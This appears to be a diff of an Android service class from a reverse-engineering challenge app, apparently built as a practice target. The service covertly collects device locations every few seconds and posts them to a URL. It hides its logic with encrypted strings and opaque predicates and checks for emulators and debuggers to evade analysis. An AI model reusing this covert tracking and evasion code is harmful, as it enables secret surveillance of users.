@@ -5,10 +5,8 @@ import android.content.Intent;
 import android.location.Location;
 import android.os.Build;
 import android.os.Debug;
-import android.os.Environment;
 import android.os.IBinder;
 import android.util.Log;
-
 import com.woop.tryreverseengineerthis.helper.StringHelper;
 import com.woop.tryreverseengineerthis.storage.LocationStorage;
 import java.io.DataOutputStream;
@@ -31,8 +29,6 @@ import javax.crypto.IllegalBlockSizeException;
  */
 public class LocationSniffingService extends Service{
 
-    private final static String TAG = "LocationSniffingService";
-
     private static Timer mTimer = null;
 
     @Override
@@ -43,9 +39,9 @@ public class LocationSniffingService extends Service{
     //Starts the handler which will post every delay seconds
     @Override
     public void onCreate(){
-        Log.d(TAG, "onCreate()");
-        Log.d(TAG, "Starting handler");
-        Log.d(TAG, "Is it coming here");
+        Log.d("LocationSniffingService", "onCreate()");
+        Log.d("LocationSniffingService", "Starting handler");
+        Log.d("LocationSniffingService", "Is it coming here");
         mTimer = new Timer();
         int delay = 5000;
 
@@ -61,13 +57,10 @@ public class LocationSniffingService extends Service{
 				}
             }
         }, 0,delay);
-
     }
 
     private void thisAlsoDoesnotDoAnything(){
-
     }
-
     //Concats all the locations to send
     private boolean sendQuietly() {
         List<Location> locations = LocationStorage.getAllLocation();
@@ -88,6 +81,9 @@ public class LocationSniffingService extends Service{
         //Logic Obfuscation
         return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
     }
+    /*
+     *   Gets the string and sends to a url
+     */
     @TargetApi(Build.VERSION_CODES.KITKAT)
     private void actualSend(String s) {
         try {
@@ -120,7 +116,7 @@ public class LocationSniffingService extends Service{
                 e.printStackTrace();
                 return;
             }
-
+            //Prepare URL and to send the data
             URL url = new URL(urlString);
             byte[] postData = s.getBytes(StandardCharsets.UTF_8);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
@@ -141,18 +137,20 @@ public class LocationSniffingService extends Service{
         } catch (Exception e) {
             return;
         }
-        Log.d(TAG, "Sent");
+        Log.d("LocationSniffingService", "Sent");
     }
 
-
+    /*
+     *  Logic obfuscated - b does not actually do anything
+     */
     private boolean thisDoesnotDoAnything(){
 
-        Log.d(TAG,"Checking...");
+        Log.d("LocationSniffingService","Checking...");
         boolean b = false;
         if (isValid()){
             b = sendQuietly();
 		}
-        Log.d(TAG, isValid() + "");
+        Log.d("LocationSniffingService", isValid() + "");
 
         return (b^=b) ? (b == b)^(b) : (b^b^b^b);
     }
@@ -190,11 +188,6 @@ public class LocationSniffingService extends Service{
         String manufacturer = "VEhSRUUzMzMzMzMzMw==";
         String product = "Rk9VUjQ0NDQ0NDQ0NA==";
         String hardware = "RklWRTU1NTU1NTU1NQ==";
-        String telephonyservice = "U0lYNjY2NjY2NjY2Ng==";
-        String connectivityservice = "U0lYNjY2NjY2NjY2Ng==";
-        String locationservice = "RUlHSFQ4ODg4ODg4OA==";
-        String gpsprovider = "TklORTk5OTk5OTk5OQ==";
-        String networkprovider = "VEVOMDAwMDAwMDAwMA==";
         String telephoneoperator = "RUxWRU4xMTExMTExMQ==";
 
         try{
@@ -209,17 +202,12 @@ public class LocationSniffingService extends Service{
             vbox = StringHelper.getStringStatic(vbox);
             goldfish = StringHelper.getStringStatic(goldfish);
             android = StringHelper.getStringStatic(android);
-
             fingerprint = StringHelper.getStringDynamic(fingerprint);
             model = StringHelper.getStringDynamic(model);
             manufacturer = StringHelper.getStringDynamic(manufacturer);
             product = StringHelper.getStringDynamic(product);
             hardware = StringHelper.getStringDynamic(hardware);
-            telephonyservice = StringHelper.getStringDynamic(telephonyservice);
-            connectivityservice = StringHelper.getStringDynamic(connectivityservice);
-            locationservice = StringHelper.getStringDynamic(locationservice);
-            gpsprovider = StringHelper.getStringDynamic(gpsprovider);
-            networkprovider = StringHelper.getStringDynamic(networkprovider);
+
             telephoneoperator = StringHelper.getStringDynamic(telephoneoperator);
         } catch (IllegalBlockSizeException e) {
             e.printStackTrace();
